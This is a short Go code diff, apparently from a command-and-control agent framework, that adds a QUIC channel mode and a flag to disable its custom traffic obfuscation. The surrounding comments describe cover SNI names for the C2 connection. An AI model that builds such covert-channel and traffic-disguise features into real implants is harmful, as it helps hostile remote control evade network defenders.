@@ -59,6 +59,7 @@ const (
 	// CBOR MsgAuth/MsgTunData stays authoritative for trust and routing.
 	C2ChannelModePlainHTTP = "http_poll"
 	C2ChannelModeH2Conn    = "h2conn"
+	C2ChannelModeQUIC      = "quic"
 	C2ChannelModeDefault   = C2ChannelModePlainHTTP
 )
 
@@ -160,6 +161,12 @@ type Config struct {
 	// be an arbitrary cover name while the server cert is still verified
 	// against the real C2 host.
 	SNI string `cbor:"81,keyasint"`
+
+	// QUICStandardKey disables the custom QUIC datagram obfuscation and uses
+	// stock QUIC (the RFC initial salt). That makes the transport interoperable
+	// with arbitrary QUIC/HTTP3 peers, at the cost of exposing the Initial
+	// payload to any observer that knows the standard salt.
+	QUICStandardKey bool `cbor:"82,keyasint"`
 
 	// Runtime state (not persisted in config file)
 	MyAgentToken *AgentToken `cbor:"-"` // Current AgentToken issued by C2
